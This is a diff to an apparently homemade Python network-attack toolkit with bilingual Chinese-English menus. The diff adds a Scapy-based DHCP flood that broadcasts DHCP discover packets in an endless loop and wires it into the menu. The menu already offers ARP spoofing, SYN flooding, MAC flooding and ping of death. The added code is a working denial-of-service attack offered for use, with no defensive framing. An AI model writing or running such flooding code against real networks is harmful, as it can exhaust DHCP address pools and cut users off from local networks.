@@ -21,6 +21,7 @@ except:
     input("按回车退出")
     sys.exit(0)
 import random, sys, uuid, os#导入需要的自带模块
+import socket as sk
 
 print("The program must be run in utf-8.")#不知道为什么总有人用其他编码导致中文出问题。
 print("必须以UTF-8编码运行程序")
@@ -116,8 +117,13 @@ def nmap_port_scan():#nmap扫描所有端口状态
             for port in lport:
                 print('port:%s\tstate:%s'%(port,nm[host][proto][port]['state']))
 
-def DCHP_attack():
-    pass
+def DHCP_flood():
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(options=[("message-type","discover"),"end"])
+    while True:
+        try:
+            srp(packet)
+        except KeyboardInterrupt:
+            break
 
 def death_ping():
     target = input("Enter the target like 127.0.0.1:")
@@ -173,6 +179,7 @@ while True:#喜闻乐见的主循环
     print("Read Save pcap file(6)")
     print("ARPspoof with not ARPPing(7)")
     print("macof(8)")
+    print("DHCP flood(9)")
     print("退出(0)")
     print("ARP欺骗带ARPPing(内网用)。(1)")
     print("SYN洪水(2)")
@@ -182,6 +189,7 @@ while True:#喜闻乐见的主循环
     print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")
     print("ARP欺骗不带ARPPing版(7)")
     print("伪macof(8)")
+    print("DHCP洪水(9)")
 
     choose = input(">>>")#用户选择输入
 
@@ -208,5 +216,7 @@ while True:#喜闻乐见的主循环
         ARP_poof_with_not_ARPping()
     elif choose == 8:
         macof()
+    elif choose == 9:
+        DHCP_flood()
     else:#如果输入无效就告诉用户输入无效
         print("Don't have this choose")
